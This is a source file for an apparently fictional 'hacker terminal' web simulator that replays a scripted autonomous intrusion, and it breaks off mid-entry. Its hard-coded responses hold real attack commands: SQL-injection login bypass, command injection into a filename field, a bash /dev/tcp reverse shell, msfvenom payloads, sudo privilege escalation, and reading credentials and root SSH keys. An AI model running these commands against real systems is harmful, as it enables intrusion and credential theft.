"use client"

import type React from "react"

import { useState, useEffect, useRef, useCallback } from "react"
import { Button } from "@/components/ui/button"
import { Textarea } from "@/components/ui/textarea"
import { useToast } from "@/hooks/use-toast"

export default function HackerTerminal() {
  const { toast } = useToast()
  const terminalRef = useRef<HTMLDivElement>(null)
  const thoughtLogRef = useRef<HTMLDivElement>(null)
  const godmodeInputRef = useRef<HTMLTextAreaElement>(null)
  const apiStatusRef = useRef<HTMLDivElement>(null)

  const [sessionHistory, setSessionHistory] = useState<
    Array<{
      command: string
      output: string
      thought: string
      godmode_influence: string
    }>
  >([])
  const [godmodeCommand, setGodmodeCommand] = useState("")
  const [lastApiCall, setLastApiCall] = useState(0)
  const [soundEnabled, setSoundEnabled] = useState(true)
  const [apiCallDelay, setApiCallDelay] = useState(15000) // 15 seconds
  const [apiCallCount, setApiCallCount] = useState(0)
  const [isThoughtStreaming, setIsThoughtStreaming] = useState(false)
  const [pendingGodModeCommand, setPendingGodModeCommand] = useState<string | null>(null)
  const [showApiStatus, setShowApiStatus] = useState(false)
  const [isInitialized, setIsInitialized] = useState(false)

  // Audio references
  const typingSound1Ref = useRef<HTMLAudioElement | null>(null)
  const typingSound2Ref = useRef<HTMLAudioElement | null>(null)

  const addThought = useCallback(
    async (thought: string) => {
      setIsThoughtStreaming(true)
      if (!thoughtLogRef.current) return
      let i = 0
      const intervalId = setInterval(() => {
        if (!thoughtLogRef.current) {
          clearInterval(intervalId)
          return
        }
        thoughtLogRef.current.textContent += thought[i]
        thoughtLogRef.current.scrollTop = thoughtLogRef.current.scrollHeight
        i++
        if (i >= thought.length) {
          clearInterval(intervalId)
          setIsThoughtStreaming(false)
          if (pendingGodModeCommand) {
            addGodModeThought(pendingGodModeCommand)
            setPendingGodModeCommand(null)
          }
        }
      }, 20)
    },
    [pendingGodModeCommand],
  )

  const addGodModeThought = useCallback((command: string) => {
    if (!thoughtLogRef.current) return
    const thought = `[GodMode Command: ${command}]`
    thoughtLogRef.current.textContent += `\n${thought}\n`
    thoughtLogRef.current.scrollTop = thoughtLogRef.current.scrollHeight
  }, [])

  const simulateTyping = useCallback(
    async (command: string) => {
      return new Promise<void>((resolve) => {
        if (!terminalRef.current) {
          resolve()
          return
        }

        let i = 0
        const typingInterval = setInterval(() => {
          if (!terminalRef.current) {
            clearInterval(typingInterval)
            resolve()
            return
          }

          terminalRef.current.textContent += command[i]
          terminalRef.current.scrollTop = terminalRef.current.scrollHeight

          // Play typing sound
          if (soundEnabled) {
            const soundToPlay = i % 2 === 0 ? typingSound1Ref.current : typingSound2Ref.current
            soundToPlay?.play().catch((error) => {
              console.warn("Autoplay prevented:", error)
            })
          }

          i++
          if (i >= command.length) {
            clearInterval(typingInterval)
            resolve()
          }
        }, 30)
      })
    },
    [soundEnabled],
  )

  const streamOutput = useCallback(async (output: string) => {
    return new Promise<void>((resolve) => {
      if (!terminalRef.current) {
        resolve()
        return
      }

      let i = 0
      const streamInterval = setInterval(() => {
        if (!terminalRef.current) {
          clearInterval(streamInterval)
          resolve()
          return
        }

        terminalRef.current.textContent += output[i]
        terminalRef.current.scrollTop = terminalRef.current.scrollHeight

        i++
        if (i >= output.length) {
          clearInterval(streamInterval)
          showInputLine()
          resolve()
        }
      }, 1)
    })
  }, [])

  const showInputLine = useCallback(() => {
    if (!terminalRef.current) return
    const inputLine = "\nhacker@machine:~$ "
    terminalRef.current.textContent += inputLine
    terminalRef.current.scrollTop = terminalRef.current.scrollHeight
  }, [])

  const initializeHackerSim = useCallback(async () => {
    updateApiStatus("HackerSim initialized. Hacker beginning autonomous session.")
    const initialContent = `Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-72-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of ${new Date().toUTCString()}

  System load:  0.08               Processes:             109
  Usage of /:   62.9% of 19.56GB   Users logged in:       1
  Memory usage: 40%                IPv4 address for eth0: 192.168.1.100
  Swap usage:   0%

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Last login: ${new Date(Date.now() - 3600000).toUTCString()} from 192.168.1.50`

    if (terminalRef.current) {
      terminalRef.current.innerHTML = initialContent
      showInputLine()
    }

    setSessionHistory([
      {
        command: "",
        output: initialContent,
        thought: "Time to start exploring this system. What should I look for first?",
        godmode_influence: "",
      },
    ])

    try {
      await addThought("Time to start exploring this system. What should I look for first?")
      setTimeout(() => progressHackerSession(), 1000)
    } catch (error) {
      console.error("Error initializing HackerSim:", error)
      updateApiStatus(`Error initializing HackerSim: ${error instanceof Error ? error.message : "Unknown error"}`)
      setTimeout(() => progressHackerSession(), 1000)
    }
  }, [addThought, showInputLine])

  useEffect(() => {
    // Initialize audio elements
    typingSound1Ref.current = new Audio(
      "https://cdn.pixabay.com/download/audio/2022/03/24/audio_ef3fa634de.mp3?filename=keyboard-spacebar-hit-101812.mp3",
    )
    typingSound2Ref.current = new Audio(
      "https://cdn.pixabay.com/download/audio/2022/03/15/audio_bca2811b06.mp3?filename=keyboard5-88069.mp3",
    )

    // Initialize terminal
    if (!isInitialized) {
      initializeHackerSim()
      setIsInitialized(true)
    }

    return () => {
      // Cleanup audio elements
      if (typingSound1Ref.current) {
        typingSound1Ref.current.pause()
        typingSound1Ref.current = null
      }
      if (typingSound2Ref.current) {
        typingSound2Ref.current.pause()
        typingSound2Ref.current = null
      }
    }
  }, [isInitialized, initializeHackerSim])

  const updateApiStatus = (message: string) => {
    if (!apiStatusRef.current) return

    const statusLine = document.createElement("div")
    statusLine.textContent = `[${new Date().toLocaleTimeString()}] ${message}`
    apiStatusRef.current.appendChild(statusLine)
    apiStatusRef.current.scrollTop = apiStatusRef.current.scrollHeight
  }

  const waitForNextCallWindow = async () => {
    const now = Date.now()
    const timeToWait = Math.max(0, apiCallDelay - (now - lastApiCall))

    if (timeToWait > 0) {
      updateApiStatus(`Waiting ${timeToWait / 1000} seconds before next hacker action`)
      await new Promise((resolve) => setTimeout(resolve, timeToWait))
    }

    const maxApiCallsPerFiveMinutes = 18
    if (apiCallCount >= maxApiCallsPerFiveMinutes) {
      const waitTime = 60000 // 1 minute
      updateApiStatus(`Rate limit reached. Hacker taking a short break.`)
      await addThought("Hmm, I've been going pretty fast. Maybe I should take a quick break to avoid detection.")
      await new Promise((resolve) => setTimeout(resolve, waitTime))
      setApiCallCount(0)
      await addThought("Alright, break's over. Let's get back to work.")
    }

    setLastApiCall(Date.now())
    setApiCallCount((prev) => prev + 1)

    // Reset API call count after 5 minutes
    setTimeout(() => {
      setApiCallCount(0)
    }, 300000)
  }

  const progressHackerSession = async (retryCount = 0) => {
    const requestBody = {
      session_history: sessionHistory,
      hacker_characteristics: {
        personality: "autistic",
        traits: ["determined", "clever"],
      },
      godmode_influence: godmodeCommand,
    }

    updateApiStatus(`Hacker contemplating next move...`)

    try {
      await waitForNextCallWindow()

      // Simulate API response for demo purposes
      // In a real app, you would make an actual fetch call to your API
      const simulatedResponse = simulateApiResponse(godmodeCommand)

      setApiCallDelay((prev) => Math.max(15000, prev * 0.9))
      updateApiStatus(`Hacker decided on next action.`)

      await addThought(simulatedResponse.current_thought)
      await simulateTyping(simulatedResponse.current_command)
      await streamOutput(simulatedResponse.current_output)

      setSessionHistory((prev) => [
        ...prev,
        {
          command: simulatedResponse.current_command,
          output: simulatedResponse.current_output,
          thought: simulatedResponse.current_thought,
          godmode_influence: godmodeCommand,
        },
      ])

      setGodmodeCommand("") // Reset godmode influence after it's been used

      setTimeout(() => progressHackerSession(), 10000 + Math.random() * 5000)
    } catch (error) {
      console.error("Error:", error)
      if (retryCount < 3) {
        console.log(`Retrying hacker session (Attempt ${retryCount + 1})`)
        await new Promise((resolve) => setTimeout(resolve, apiCallDelay))
        await progressHackerSession(retryCount + 1)
      } else {
        updateApiStatus(
          `Error in hacker session: ${error instanceof Error ? error.message : "Unknown error"}. Restarting...`,
        )
        setTimeout(() => progressHackerSession(), 10000)
      }
    }
  }

  const simulateApiResponse = (godmodeInfluence: string) => {
    // Get the last command and output from session history to determine next steps
    const lastSession = sessionHistory[sessionHistory.length - 1]
    const lastCommand = lastSession?.command || ""
    const lastOutput = lastSession?.output || ""

    // Track all previous commands to avoid repetition
    const allPreviousCommands = sessionHistory.map((session) => session.command)

    // If there's godmode influence, prioritize it
    if (godmodeInfluence && godmodeInfluence.trim() !== "") {
      // Don't execute the exact same command if it was already run
      if (allPreviousCommands.includes(godmodeInfluence)) {
        return {
          current_command: `echo "Command '${godmodeInfluence}' was already executed. Trying a variation instead."`,
          current_output: "Avoiding command repetition for better results.",
          current_thought: `I've already tried '${godmodeInfluence}'. Let me try a different approach instead.`,
        }
      }

      // Custom responses for specific command types
      if (godmodeInfluence.toLowerCase().includes("scan") && godmodeInfluence.toLowerCase().includes("network")) {
        return {
          current_command: "nmap -sV -p- --min-rate 1000 192.168.1.0/24",
          current_output:
            "Starting Nmap 7.80 ( https://nmap.org )\nStats: 0:02:43 elapsed; 256 hosts completed (5 up), 5 undergoing SYN Stealth Scan\nNmap scan report for router.local (192.168.1.1)\nHost is up (0.0023s latency).\nNot shown: 65530 filtered ports\nPORT     STATE  SERVICE     VERSION\n22/tcp   open   ssh         OpenSSH 8.2p1\n80/tcp   open   http        nginx 1.18.0\n443/tcp  open   ssl/https   nginx 1.18.0\n8080/tcp closed http-proxy\n8443/tcp closed https-alt\n\nNmap scan report for desktop.local (192.168.1.50)\nHost is up (0.0045s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.52\n\nNmap scan report for laptop.local (192.168.1.75)\nHost is up (0.0089s latency).\nNot shown: 65532 closed ports\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 8.8p1\n445/tcp  open  microsoft-ds Samba smbd 4.6.2\n3389/tcp open  ms-wbt-server xrdp\n\nNmap scan report for server.local (192.168.1.100)\nHost is up (0.0010s latency).\nNot shown: 65530 closed ports\nPORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu\n80/tcp   open  http       Apache httpd 2.4.52\n443/tcp  open  ssl/https  Apache httpd 2.4.52\n3306/tcp open  mysql      MySQL 8.0.32\n5432/tcp open  postgresql PostgreSQL 14.7\n\nNmap scan report for printer.local (192.168.1.200)\nHost is up (0.0156s latency).\nNot shown: 65533 closed ports\nPORT    STATE SERVICE  VERSION\n80/tcp  open  http     Jetty 9.4.46.v20220331\n631/tcp open  ipp      CUPS 2.4.1\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 256 IP addresses (5 hosts up) scanned in 186.32 seconds",
          current_thought:
            "Comprehensive network scan complete. Found 5 hosts with various services. The server at 192.168.1.100 looks particularly interesting with multiple services running including MySQL and PostgreSQL.",
        }
      } else if (
        godmodeInfluence.toLowerCase().includes("vuln") ||
        godmodeInfluence.toLowerCase().includes("exploit")
      ) {
        return {
          current_command: "nmap --script vuln 192.168.1.50",
          current_output:
            "Starting Nmap 7.80 ( https://nmap.org )\nPre-scan script results:\n| broadcast-avahi-dos: \n|   Discovered hosts:\n|     224.0.0.251\n|   After NULL UDP avahi packet DoS (CVE-2011-1002).\n|_  Hosts are all up (not vulnerable).\nNmap scan report for desktop.local (192.168.1.50)\nHost is up (0.0045s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE\n22/tcp open  ssh\n| vulners: \n|   cpe:/a:openbsd:openssh:8.9p1: \n|     	CVE-2023-38408	7.5	https://vulners.com/cve/CVE-2023-38408\n|     	CVE-2021-41617	4.4	https://vulners.com/cve/CVE-2021-41617\n|_    	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145\n80/tcp open  http\n| http-csrf: \n| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=desktop.local\n|   Found the following possible CSRF vulnerabilities: \n|     \n|     Path: http://desktop.local:80/admin/\n|     Form id: login-form\n|_    Form action: login.php\n| http-enum: \n|   /admin/: Admin login page\n|   /backup/: Potentially interesting directory\n|_  /config/: Potentially interesting directory\n| http-sql-injection: \n|   Possible sqli for queries:\n|     http://desktop.local:80/admin/login.php?username=admin%27%20OR%20%271%27=%271&password=anything\n|_    http://desktop.local:80/admin/users.php?id=1%27%20OR%20%271%27=%271\n|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.\n\nNmap done: 1 IP address (1 host up) scanned in 30.58 seconds",
          current_thought:
            "Found several vulnerabilities on the desktop machine. The web server has SQL injection vulnerabilities in the admin login page and users page. There are also some potentially interesting directories like /backup/ and /config/.",
        }
      } else if (
        godmodeInfluence.toLowerCase().includes("brute") ||
        godmodeInfluence.toLowerCase().includes("password")
      ) {
        return {
          current_command:
            "hydra -l admin -P /usr/share/wordlists/rockyou-top1000.txt 192.168.1.50 http-post-form '/admin/login.php:username=^USER^&password=^PASS^:Invalid'",
          current_output:
            "Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-21 01:15:22\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 1000 login tries (l:1/p:1000), ~63 tries per task\n[DATA] attacking http-post-form://192.168.1.50:80/admin/login.php:username=^USER^&password=^PASS^:Invalid\n[80][http-post-form] host: 192.168.1.50   login: admin   password: admin123\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-21 01:16:45",
          current_thought:
            "Password brute force successful! Found credentials for the admin account: username 'admin' with password 'admin123'. Now I can log in to the admin panel properly.",
        }
      } else if (
        godmodeInfluence.toLowerCase().includes("shell") ||
        godmodeInfluence.toLowerCase().includes("reverse")
      ) {
        return {
          current_command:
            "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o reverse-shell",
          current_output:
            "[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch was selected, choosing arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 74 bytes\nFinal size of elf file: 194 bytes\nSaved as: reverse-shell",
          current_thought:
            "Created a reverse shell payload. Now I need to find a way to upload and execute it on the target system.",
        }
      } else {
        // For any other godmode command, create a custom response
        return {
          current_command: godmodeInfluence,
          current_output: `Executing custom command...\n\n${generateCustomOutput(godmodeInfluence)}`,
          current_thought: `I'll try this command: ${godmodeInfluence}`,
        }
      }
    }

    // If no godmode influence, progress through a penetration testing workflow
    // based on the last command and its output

    // Initial reconnaissance phase
    if (!lastCommand || lastCommand === "") {
      return {
        current_command: "whoami && hostname",
        current_output: "hacker\nmachine",
        current_thought: "First, let me identify who I am and what machine I'm on.",
      }
    }

    // System enumeration phase
    if (lastCommand === "whoami && hostname") {
      return {
        current_command: "ip addr show | grep inet",
        current_output:
          "    inet 127.0.0.1/8 scope host lo\n    inet6 ::1/128 scope host \n    inet 192.168.1.100/24 brd 192.168.1.255 scope global dynamic eth0\n    inet6 fe80::216:3eff:fe74:5aac/64 scope link",
        current_thought: "My IP address is 192.168.1.100. Now I need to identify other hosts in the network.",
      }
    }

    if (lastCommand.includes("ip addr") && lastOutput.includes("192.168.1.100")) {
      return {
        current_command: "ping -c 1 192.168.1.1",
        current_output:
          "PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.\n64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=0.435 ms\n\n--- 192.168.1.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 0.435/0.435/0.435/0.000 ms",
        current_thought: "The gateway at 192.168.1.1 is up. Let me try to discover other hosts in the network.",
      }
    }

    if (lastCommand.includes("ping") && lastOutput.includes("192.168.1.1")) {
      return {
        current_command:
          'for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" | cut -d " " -f 4 | tr -d ":") & done',
        current_output: "192.168.1.1\n192.168.1.50\n192.168.1.75\n192.168.1.100\n192.168.1.200",
        current_thought:
          "Found several hosts in the network: 192.168.1.1 (likely the router), 192.168.1.50, 192.168.1.75, 192.168.1.100 (my machine), and 192.168.1.200. Let me scan one of these hosts for open ports.",
      }
    }

    if (lastCommand.includes("for i in {1..254}") && lastOutput.includes("192.168.1.50")) {
      return {
        current_command: "nmap -A 192.168.1.50",
        current_output:
          "Starting Nmap 7.80 ( https://nmap.org )\nNmap scan report for desktop.local (192.168.1.50)\nHost is up (0.0045s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 3e:ba:5d:95:c1:24:a3:56:3c:6d:3e:a2:fd:e3:52:59 (ECDSA)\n|_  256 76:6e:4e:e8:0c:a1:cb:2d:1e:4e:97:eb:5a:5a:ac:68 (ED25519)\n80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))\n|_http-server-header: Apache/2.4.52 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.85 seconds",
        current_thought:
          "The desktop machine at 192.168.1.50 has SSH (port 22) and HTTP (port 80) services running. Let me check what's on the web server.",
      }
    }

    if (lastCommand.includes("nmap -A") && lastOutput.includes("80/tcp open  http")) {
      return {
        current_command: "curl -s -I http://192.168.1.50/",
        current_output:
          'HTTP/1.1 200 OK\nDate: Fri, 21 Mar 2025 01:25:12 GMT\nServer: Apache/2.4.52 (Ubuntu)\nLast-Modified: Fri, 20 Mar 2025 23:15:32 GMT\nETag: "2aa6-6062a3e8e1c80"\nAccept-Ranges: bytes\nContent-Length: 10918\nVary: Accept-Encoding\nContent-Type: text/html',
        current_thought: "The web server is running Apache 2.4.52 on Ubuntu. Let me check the content of the website.",
      }
    }

    if (lastCommand.includes("curl -s -I") && lastOutput.includes("Apache/2.4.52")) {
      return {
        current_command: 'curl -s http://192.168.1.50/ | grep -i "<title\\|admin\\|login"',
        current_output:
          '<title>Company Internal Portal</title>\n<a href="/admin/">Admin Login</a>\n<a href="/login.php">User Login</a>',
        current_thought: "Found an admin login page and a user login page. Let me check the admin page first.",
      }
    }

    if (lastCommand.includes('grep -i "<title\\|admin\\|login"') && lastOutput.includes("Admin Login")) {
      return {
        current_command: "curl -s http://192.168.1.50/admin/",
        current_output:
          '<!DOCTYPE html>\n<html>\n<head>\n<title>Admin Login</title>\n</head>\n<body>\n<h1>Admin Login</h1>\n<form id="login-form" method="post" action="login.php">\n<label for="username">Username:</label>\n<input type="text" id="username" name="username"><br><br>\n<label for="password">Password:</label>\n<input type="password" id="password" name="password"><br><br>\n<input type="submit" value="Login">\n</form>\n</body>\n</html>',
        current_thought: "Found an admin login form. Let me try some basic SQL injection to bypass authentication.",
      }
    }

    if (lastCommand.includes("curl -s http://192.168.1.50/admin/") && lastOutput.includes("login-form")) {
      return {
        current_command:
          "curl -s -X POST -d \"username=admin' OR '1'='1&password=anything\" http://192.168.1.50/admin/login.php",
        current_output:
          '<!DOCTYPE html>\n<html>\n<head>\n<title>Admin Panel</title>\n</head>\n<body>\n<h1>Welcome, Administrator!</h1>\n<p>You have successfully logged in.</p>\n<h2>System Information</h2>\n<pre>\nHostname: desktop\nIP: 192.168.1.50\nOS: Ubuntu 22.04.2 LTS\nKernel: 5.15.0-72-generic\nUptime: 2 days, 3 hours, 45 minutes\n</pre>\n<h2>Quick Actions</h2>\n<ul>\n<li><a href="users.php">Manage Users</a></li>\n<li><a href="backup.php">System Backup</a></li>\n<li><a href="logs.php">View Logs</a></li>\n<li><a href="config.php">System Configuration</a></li>\n</ul>\n</body>\n</html>',
        current_thought:
          "SQL injection worked! I'm in the admin panel. Let me check the available options. The backup page might be interesting.",
      }
    }

    if (
      lastCommand.includes("curl -s -X POST -d \"username=admin' OR '1'='1") &&
      lastOutput.includes("System Backup")
    ) {
      return {
        current_command: "curl -s http://192.168.1.50/admin/backup.php",
        current_output:
          '<!DOCTYPE html>\n<html>\n<head>\n<title>System Backup</title>\n</head>\n<body>\n<h1>System Backup</h1>\n<p>Last backup: 2025-03-20 00:00:01</p>\n<p>Backup location: /var/backups/system/</p>\n<p>Backup command: tar -czf /var/backups/system/backup_$(date +%Y%m%d).tar.gz /etc /var/www/html</p>\n<form method="post" action="create_backup.php">\n<label for="filename">Backup filename:</label>\n<input type="text" id="filename" name="filename" value="backup_$(date +%Y%m%d).tar.gz"><br><br>\n<input type="submit" value="Create New Backup">\n</form>\n</body>\n</html>',
        current_thought:
          "The backup page shows the backup command which uses the 'tar' command with user input. This could be vulnerable to command injection since it's using the filename in a command.",
      }
    }

    if (lastCommand.includes("curl -s http://192.168.1.50/admin/backup.php") && lastOutput.includes("Backup command")) {
      return {
        current_command: 'curl -s -X POST -d "filename=test$(id).tar.gz" http://192.168.1.50/admin/create_backup.php',
        current_output:
          '<!DOCTYPE html>\n<html>\n<head>\n<title>Backup Created</title>\n</head>\n<body>\n<h1>Backup Created</h1>\n<p>Backup command executed: tar -czf /var/backups/system/testuid=33(www-data) gid=33(www-data) groups=33(www-data).tar.gz /etc /var/www/html</p>\n<p>Return to <a href="backup.php">Backup Page</a></p>\n</body>\n</html>',
        current_thought:
          "Command injection successful! The server executed the 'id' command. This confirms the web application is vulnerable to command injection. I can use this to get a reverse shell.",
      }
    }

    if (
      lastCommand.includes('curl -s -X POST -d "filename=test$(id).tar.gz"') &&
      lastOutput.includes("uid=33(www-data)")
    ) {
      return {
        current_command: "which nc netcat python python3 perl php ruby",
        current_output: "/usr/bin/nc\n/usr/bin/python3\n/usr/bin/perl\n/usr/bin/php\n/usr/bin/ruby",
        current_thought: "Let me check what tools are available on my machine for setting up a reverse shell listener.",
      }
    }

    if (lastCommand.includes("which nc") && lastOutput.includes("/usr/bin/nc")) {
      return {
        current_command: "nc -lvnp 4444",
        current_output: "Listening on 0.0.0.0 4444",
        current_thought: "Setting up a netcat listener on port 4444 to receive the reverse shell connection.",
      }
    }

    if (lastCommand === "nc -lvnp 4444") {
      return {
        current_command:
          "curl -s -X POST -d \"filename=test$(bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1').tar.gz\" http://192.168.1.50/admin/create_backup.php",
        current_output:
          '<!DOCTYPE html>\n<html>\n<head>\n<title>Backup Created</title>\n</head>\n<body>\n<h1>Backup Created</h1>\n<p>Backup command executed: tar -czf /var/backups/system/test.tar.gz /etc /var/www/html</p>\n<p>Return to <a href="backup.php">Backup Page</a></p>\n</body>\n</html>',
        current_thought: "Sent the reverse shell command. Now checking if we got a connection back on our listener.",
      }
    }

    if (
      lastCommand.includes("curl -s -X POST -d \"filename=test$(bash -c 'bash -i >& /dev/tcp/") &&
      lastOutput.includes("Backup Created")
    ) {
      return {
        current_command: "# Connection received on 192.168.1.50 45678",
        current_output:
          "bash: cannot set terminal process group (1234): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@desktop:/var/www/html/admin$ whoami\nwww-data\nwww-data@desktop:/var/www/html/admin$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nwww-data@desktop:/var/www/html/admin$",
        current_thought: "Got a reverse shell as www-data! Now I need to escalate privileges to get root access.",
      }
    }

    if (lastCommand.includes("# Connection received") && lastOutput.includes("www-data")) {
      return {
        current_command: "www-data@desktop:/var/www/html/admin$ python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
        current_output: "www-data@desktop:/var/www/html/admin$",
        current_thought:
          "Upgraded to a better shell using Python. Now let me check what sudo privileges this user has.",
      }
    }

    if (lastCommand.includes("python3 -c 'import pty; pty.spawn") && lastOutput.includes("www-data@desktop")) {
      return {
        current_command: "www-data@desktop:/var/www/html/admin$ sudo -l",
        current_output:
          "Matching Defaults entries for www-data on desktop:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser www-data may run the following commands on desktop:\n    (ALL) NOPASSWD: /usr/bin/find",
        current_thought:
          "Interesting! The www-data user can run the 'find' command with sudo without a password. This is a privilege escalation vector.",
      }
    }

    if (lastCommand.includes("sudo -l") && lastOutput.includes("NOPASSWD: /usr/bin/find")) {
      return {
        current_command: "www-data@desktop:/var/www/html/admin$ sudo find . -exec /bin/sh \\; -quit",
        current_output: "# whoami\nroot\n# id\nuid=0(root) gid=0(root) groups=0(root)\n#",
        current_thought:
          "Privilege escalation successful! I now have root access on the target system. Let's see what sensitive information we can find.",
      }
    }

    if (lastCommand.includes("sudo find . -exec /bin/sh") && lastOutput.includes("uid=0(root)")) {
      return {
        current_command: '# grep -r "password" /etc/ 2>/dev/null | grep -v "#" | head -n 10',
        current_output:
          "/etc/mysql/debian.cnf:password = rootpassword123\n/etc/phpmyadmin/config-db.php:$dbpass='phpmyadmin123';\n/etc/apache2/sites-available/000-default.conf:    SetEnv DB_PASSWORD \"dbpassword456\"\n/etc/ssh/sshd_config:PermitRootLogin prohibit-password",
        current_thought:
          "Found some passwords in configuration files. Let me check if there are any interesting databases on this system.",
      }
    }

    if (lastCommand.includes('grep -r "password"') && lastOutput.includes("mysql")) {
      return {
        current_command: '# mysql -u root -prootpassword123 -e "SHOW DATABASES;"',
        current_output:
          "mysql: [Warning] Using a password on the command line interface can be insecure.\nDatabase\ninformation_schema\nmysql\nperformance_schema\nsys\nusers",
        current_thought:
          "Successfully connected to MySQL with the root password. There's a 'users' database that might contain interesting information.",
      }
    }

    if (lastCommand.includes("mysql -u root") && lastOutput.includes("users")) {
      return {
        current_command: '# mysql -u root -prootpassword123 -e "USE users; SHOW TABLES;"',
        current_output:
          "mysql: [Warning] Using a password on the command line interface can be insecure.\nTables_in_users\nadmins\nemployees",
        current_thought: "The users database has tables for admins and employees. Let me check the admins table.",
      }
    }

    if (lastCommand.includes("SHOW TABLES") && lastOutput.includes("admins")) {
      return {
        current_command: '# mysql -u root -prootpassword123 -e "USE users; SELECT * FROM admins;"',
        current_output:
          "mysql: [Warning] Using a password on the command line interface can be insecure.\nid\tusername\tpassword\temail\n1\tadmin\t5f4dcc3b5aa765d61d8327deb882cf99\tadmin@company.local\n2\tjohn\t527bd5b5d689e2c32ae974c6229ff785\tjohn@company.local\n3\tsarah\t9e9d7a08e048e9d604b79460b54969c3\tsarah@company.local",
        current_thought:
          "Found admin usernames, email addresses, and password hashes. These hashes could be cracked offline. Let me check if there are any SSH keys that could be used for lateral movement.",
      }
    }

    if (lastCommand.includes("SELECT * FROM admins") && lastOutput.includes("password")) {
      return {
        current_command: '# find / -name "id_rsa" 2>/dev/null',
        current_output: "/root/.ssh/id_rsa\n/home/john/.ssh/id_rsa\n/var/backups/ssh_keys/id_rsa",
        current_thought: "Found several SSH private keys. Let me check the one in root's directory first.",
      }
    }

    if (lastCommand.includes('find / -name "id_rsa"') && lastOutput.includes("/root/.ssh/id_rsa")) {
      return {
        current_command: "# cat /root/.ssh/id_rsa",
        current_output:
          "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAtG9OP3+WgVc6jyc8+tZHs6aJLpjuYUU+QTwQpBDHJ5HSsITNpX/x\nkfuUGlLTYTTYY8KjRV6EgJj1fwBLTLZKJWO1rUDXDxCl4J3cqDK8F0Cj+F0W7hQbj7g1LO\n...[TRUNCATED]...\nAAGBALRvTj9/loFXOo8nPPrWR7OmiS6Y7mFFPkE8EKQQ\n-----END OPENSSH PRIVATE KEY-----",
        current_thought:
          "Got the root's SSH private key. Let me check if there are any authorized hosts in the authorized_keys file.",
      }
    }

    if (lastCommand.includes("cat /root/.ssh/id_rsa") && lastOutput.includes("OPENSSH PRIVATE KEY")) {
      return {
        current_command: "# cat /root/.ssh/authorized_keys",
        current_output:
          "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0b04/f5aBVzqPJzz61kezpokumO5hRT5BPBCkEMcnkdKwhM2lf/GR+5QaUtNhNNhjwqNFXoSAmPV/AEtMtkolY7WtQNcPEKXgndyoMrwXQKP4XRbuFBuPuDUs root@server",
        current_thought:
          "The authorized_keys file shows this key is for the root user on a machine called 'server'. This might be the server at 192.168.1.100. Let me check if there are any other interesting machines we can pivot to.",
      }
    }

    if (lastCommand.includes("cat /root/.ssh/authorized_keys") && lastOutput.includes("root@server")) {
      return {
        current_command: "# cat /etc/hosts",
        current_output:
          "127.0.0.1       localhost\n127.0.1.1       desktop\n192.168.1.1     router.local\n192.168.1.50    desktop.local\n192.168.1.75    laptop.local\n192.168.1.100   server.local\n192.168.1.200   printer.local\n\n# The following lines are desirable for IPv6 capable hosts\n::1     ip6-localhost ip6-loopback\nfe00::0 ip6-localnet\nff00::0 ip6-mcastprefix\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters",
        current_thought:
          "The hosts file confirms the network layout we discovered earlier. Now that we have root access on the desktop, we can pivot to other machines in the network.",
      }
    }

    if (lastCommand.includes("cat /etc/hosts") && lastOutput.includes("server.local")) {
      return {
        current_command: "# ssh -i /root/.ssh/id_rsa root@192.168.1.100",
        current_output:
